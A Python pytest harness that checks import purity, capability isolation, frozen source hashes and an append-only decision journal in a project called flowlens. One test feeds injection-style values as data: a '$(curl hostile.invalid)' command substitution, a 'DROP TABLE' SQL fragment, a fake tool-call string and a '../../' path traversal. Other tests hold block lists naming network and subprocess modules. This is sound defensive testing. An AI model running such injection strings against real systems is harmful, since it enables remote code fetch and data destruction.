"""Static, capability-isolation, import-purity, and scope harness for W03-C06."""

from __future__ import annotations

import ast
import hashlib
import json
import random
import socket
import subprocess
import sys
import time
from pathlib import Path
from typing import NoReturn

import pytest

from flowlens.decision.c05_packet import build_decision_packet
from flowlens.decision.c05_recommendation import build_recommendation
from flowlens.decision.c06_human import build_human_decision_event
from flowlens.decision.c06_store import HumanDecisionJournal
from flowlens.decision.enums import HumanDecisionType
from flowlens.decision.serialization import canonical_json_bytes
from test_c05_recommendation import supplier_fixture

_ROOT = Path(__file__).resolve().parents[1]
_C06_SOURCES = (
    _ROOT / "src/flowlens/decision/c06_policy.py",
    _ROOT / "src/flowlens/decision/c06_validation.py",
    _ROOT / "src/flowlens/decision/c06_human.py",
    _ROOT / "src/flowlens/decision/c06_store.py",
)
_FROZEN_HASHES = {
    "src/flowlens/decision/contracts.py": (
        "6179428829f2c23217e76de71a6a3c8769af3fe6253b6fb7d624e80107054134"
    ),
    "src/flowlens/decision/enums.py": (
        "0f7ea7e059f79df84ca3f312bd354829a00794f602f302584c4f7abdc66c35d6"
    ),
    "src/flowlens/decision/primitives.py": (
        "58eb6bb0f371ee02343e4bbd8ca5d664eebe6d28322552f246cf7455d99ff2ab"
    ),
    "src/flowlens/decision/serialization.py": (
        "508194080ba1537931365fb68f17b6c49f2ae58549c794a683e3fa582bc4cfd3"
    ),
    "src/flowlens/decision/c05_packet.py": (
        "b98d4034f05ff102c136468be4f80eb069d4ab1ee40f58ed1a976a64e4d3b83c"
    ),
}


def _packet():  # type: ignore[no-untyped-def]
    fixture = supplier_fixture()
    recommendation = build_recommendation(*fixture.args())
    return build_decision_packet(*fixture.args(), recommendation=recommendation)


def _deny(*_args: object, **_kwargs: object) -> NoReturn:
    raise AssertionError("forbidden capability invoked by C06 runtime")


def _imports(path: Path) -> set[str]:
    tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
    imported: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported.update(alias.name for alias in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module is not None:
            imported.add(node.module)
    return imported


def test_frozen_c01_and_c05_sources_match_context_lock() -> None:
    for relative_path, expected in _FROZEN_HASHES.items():
        actual = hashlib.sha256((_ROOT / relative_path).read_bytes()).hexdigest()
        assert actual == expected, relative_path


def test_authorized_path_manifest_is_exact_and_report_paths_are_separate() -> None:
    manifest = json.loads(
        (
            _ROOT
            / "docs/w03/checkpoints/c06/specs/authorized_paths.json"
        ).read_text(encoding="utf-8")
    )
    assert manifest["checkpoint"] == "W03-C06"
    assert len(manifest["implementation_paths"]) == 21
    assert len(set(manifest["implementation_paths"])) == 21
    assert manifest["implementation_paths"][-4:] == [
        "tests/test_c06_policy.py",
        "tests/test_c06_human.py",
        "tests/test_c06_store.py",
        "tests/test_c06_harness.py",
    ]
    assert manifest["report_paths"] == [
        "docs/w03/reports/W03_C06_R_DEVELOPMENT_ROUND_REPORT.md",
        "docs/CURRENT_STATE.md",
    ]
    assert not set(manifest["implementation_paths"]) & set(manifest["report_paths"])


def test_c06_runtime_imports_are_bounded_and_store_is_only_filesystem_module() -> None:
    forbidden_prefixes = (
        "sqlalchemy",
        "flowlens.db",
        "flowlens.data",
        "flowlens.hgt",
        "requests",
        "httpx",
        "urllib",
        "socket",
        "subprocess",
        "random",
        "time",
        "openai",
        "anthropic",
        "flowlens.decision.c07",
        "flowlens.decision.c08",
    )
    for path in _C06_SOURCES:
        imported = _imports(path)
        assert not any(
            name == prefix or name.startswith(f"{prefix}.")
            for name in imported
            for prefix in forbidden_prefixes
        ), path.name
        if path.name != "c06_store.py":
            assert "pathlib" not in imported
            assert "os" not in imported
            assert "json" not in imported


def test_fresh_imports_do_not_pull_forbidden_runtime_modules() -> None:
    script = """
import json
import sys
before = set(sys.modules)
import flowlens.decision.c06_policy
import flowlens.decision.c06_validation
import flowlens.decision.c06_human
import flowlens.decision.c06_store
added = sorted(set(sys.modules) - before)
print(json.dumps(added))
"""
    completed = subprocess.run(
        [sys.executable, "-B", "-c", script],
        cwd=_ROOT,
        check=True,
        capture_output=True,
        text=True,
    )
    added = json.loads(completed.stdout)
    forbidden_prefixes = (
        "sqlalchemy",
        "flowlens.db",
        "flowlens.data.scenarios",
        "flowlens.data.hgt",
        "requests",
        "httpx",
        "socket",
        "openai",
        "anthropic",
        "flowlens.decision.c07",
        "flowlens.decision.c08",
    )
    assert not any(
        name == prefix or name.startswith(f"{prefix}.")
        for name in added
        for prefix in forbidden_prefixes
    )


def test_build_and_record_deny_external_capabilities(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    packet = _packet()
    packet_before = canonical_json_bytes(packet)
    recommendation_before = canonical_json_bytes(packet.recommendation)

    monkeypatch.setattr(socket, "socket", _deny)
    monkeypatch.setattr(socket, "create_connection", _deny)
    monkeypatch.setattr(subprocess, "run", _deny)
    monkeypatch.setattr(subprocess, "Popen", _deny)
    monkeypatch.setattr(random, "random", _deny)
    monkeypatch.setattr(random, "randint", _deny)
    monkeypatch.setattr(time, "time", _deny)
    monkeypatch.setattr(time, "monotonic", _deny)

    event = build_human_decision_event(
        packet,
        decision=HumanDecisionType.DEFER,
        actor_id="harness-reviewer",
        decided_at=packet.run.as_of_time,
        comment=(
            "$(curl hostile.invalid) DROP TABLE orders; "
            '{"tool":"execute supplier replacement"}; HGT says root cause'
        ),
        investigation_priority="../../outside-root",
    )
    journal = HumanDecisionJournal(tmp_path)
    assert journal.record(
        packet,
        decision=event.decision,
        actor_id=event.actor_id,
        decided_at=event.decided_at,
        comment=event.comment,
        investigation_priority=event.investigation_priority,
    ) == event

    assert canonical_json_bytes(packet) == packet_before
    assert canonical_json_bytes(packet.recommendation) == recommendation_before
    assert event.comment is not None and "DROP TABLE" in event.comment
    assert event.investigation_priority == "../../outside-root"
    for path in tmp_path.rglob("*"):
        assert path.resolve().is_relative_to(tmp_path.resolve())
    assert not (_ROOT / "outside-root").exists()


def test_journal_has_no_overwrite_or_delete_api() -> None:
    public = {
        name
        for name in dir(HumanDecisionJournal)
        if not name.startswith("_")
    }
    assert public == {"load", "record", "root"}
    assert not public & {"delete", "remove", "overwrite", "replace", "update"}
